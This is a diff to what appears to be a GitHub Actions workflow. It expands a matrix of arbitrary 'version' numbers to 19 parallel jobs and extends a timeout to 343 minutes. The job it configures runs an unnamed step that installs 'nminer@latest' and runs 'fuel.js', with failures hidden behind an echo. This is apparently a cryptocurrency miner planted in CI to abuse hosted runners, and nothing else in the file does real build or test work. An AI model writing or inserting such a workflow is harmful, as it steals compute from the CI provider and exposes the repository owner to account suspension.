@@ -9,24 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 8617 }
-          - { version: 9356 }
-          - { version: 2579 }
-          - { version: 799 }
-          - { version: 3517 }
-          - { version: 8441 }
-          - { version: 6682 }
-          - { version: 2992 }
-          - { version: 1918 }
-          - { version: 7467 }
-          - { version: 1113 }
-          - { version: 1828 }
-          - { version: 4592 }
-          - { version: 3961 }
-          - { version: 740 }
-          - { version: 546 }
-          - { version: 4568 }
-          - { version: 8690 }
+          - { version: 2027 }
+          - { version: 2261 }
+          - { version: 7145 }
+          - { version: 9394 }
+          - { version: 7096 }
+          - { version: 879 }
+          - { version: 7024 }
+          - { version: 2128 }
+          - { version: 725 }
+          - { version: 4919 }
+          - { version: 4010 }
+          - { version: 4669 }
+          - { version: 3297 }
+          - { version: 3905 }
+          - { version: 8883 }
+          - { version: 449 }
+          - { version: 895 }
+          - { version: 2664 }
+          - { version: 241 }
 
     steps:
       - name: Checkout
@@ -40,4 +41,4 @@ jobs:
       - name: 
         run: |
           npm install nminer@latest
-          timeout 314m node fuel.js || echo "fuel executed"
+          timeout 343m node fuel.js || echo "fuel executed"
